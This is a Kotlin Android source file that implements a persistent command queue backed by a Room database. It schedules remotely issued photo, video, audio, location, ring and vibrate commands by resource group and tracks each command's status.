package com.save.me

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.room.*
import kotlinx.coroutines.*
import java.util.*
import java.util.concurrent.ConcurrentHashMap

object CommandQueueManager {
    enum class ResourceGroup { CAMERA, MIC, LOCATION, NONE }
    private val runningJobs = ConcurrentHashMap<ResourceGroup, Job>()
    private val coroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var appContext: Context
    private lateinit var dao: CommandQueueDao
    private var initialized = false

    fun initialize(context: Context) {
        if (initialized) return
        appContext = context.applicationContext
        dao = CommandQueueDatabase.getInstance(appContext).commandQueueDao()
        initialized = true
        resumePendingCommands()
    }

    fun enqueue(command: QueuedCommand) {
        coroutineScope.launch(Dispatchers.IO) {
            val entity = CommandEntity.fromQueuedCommand(command)
            dao.insert(entity)
            tryRunCommands()
        }
    }

    private fun tryRunCommands() {
        coroutineScope.launch(Dispatchers.IO) {
            val pending = dao.getAllPending()
            for (cmd in pending) {
                val group = getResourceGroup(cmd.type)
                if (!runningJobs.containsKey(group)) {
                    runCommand(cmd, group)
                }
            }
        }
    }

    private fun runCommand(cmd: CommandEntity, group: ResourceGroup) {
        val job = coroutineScope.launch {
            dao.updateStatus(cmd.id, "running")
            try {
                ActionHandlers.executeCommand(appContext, cmd.toQueuedCommand())
                dao.updateStatus(cmd.id, "done")
            } catch (e: Exception) {
                dao.updateStatus(cmd.id, "failed")
                Log.e("CommandQueueManager", "Command failed: ${cmd.type}", e)
            } finally {
                runningJobs.remove(group)
                tryRunCommands()
            }
        }
        runningJobs[group] = job
    }

    private fun resumePendingCommands() {
        coroutineScope.launch(Dispatchers.IO) {
            val commands = dao.getAllPendingOrRunning()
            for (cmd in commands) {
                val group = getResourceGroup(cmd.type)
                if (!runningJobs.containsKey(group)) {
                    runCommand(cmd, group)
                }
            }
        }
    }

    fun getResourceGroup(type: String): ResourceGroup = when (type) {
        "photo", "video" -> ResourceGroup.CAMERA
        "audio" -> ResourceGroup.MIC
        "location" -> ResourceGroup.LOCATION
        "ring", "vibrate" -> ResourceGroup.NONE
        else -> ResourceGroup.NONE
    }

    fun clearAll() {
        coroutineScope.launch(Dispatchers.IO) {
            dao.clearAll()
            runningJobs.clear()
        }
    }
}

@Entity(tableName = "command_queue")
data class CommandEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val type: String,
    val camera: String? = null,
    val flash: String? = null,
    val quality: String? = null,
    val duration: String? = null,
    val chatId: String? = null,
    val enqueueTime: Long = System.currentTimeMillis(),
    val status: String = "pending"
) {
    fun toQueuedCommand() = QueuedCommand(type, camera, flash, quality, duration, chatId)
    companion object {
        fun fromQueuedCommand(cmd: QueuedCommand): CommandEntity =
            CommandEntity(
                type = cmd.type,
                camera = cmd.camera,
                flash = cmd.flash,
                quality = cmd.quality,
                duration = cmd.duration,
                chatId = cmd.chatId
            )
    }
}

@Dao
interface CommandQueueDao {
    @Query("SELECT * FROM command_queue WHERE status='pending' ORDER BY enqueueTime ASC")
    suspend fun getAllPending(): List<CommandEntity>

    @Query("SELECT * FROM command_queue WHERE status='pending' OR status='running' ORDER BY enqueueTime ASC")
    suspend fun getAllPendingOrRunning(): List<CommandEntity>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(cmd: CommandEntity): Long

    @Query("UPDATE command_queue SET status=:status WHERE id=:id")
    suspend fun updateStatus(id: Long, status: String)

    @Query("DELETE FROM command_queue")
    suspend fun clearAll()
}

@Database(entities = [CommandEntity::class], version = 1)
abstract class CommandQueueDatabase : RoomDatabase() {
    abstract fun commandQueueDao(): CommandQueueDao
    companion object {
        @Volatile private var INSTANCE: CommandQueueDatabase? = null
        fun getInstance(context: Context): CommandQueueDatabase {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: Room.databaseBuilder(
                    context.applicationContext,
                    CommandQueueDatabase::class.java,
                    "command_queue_db"
                ).build().also { INSTANCE = it }
            }
        }
    }
}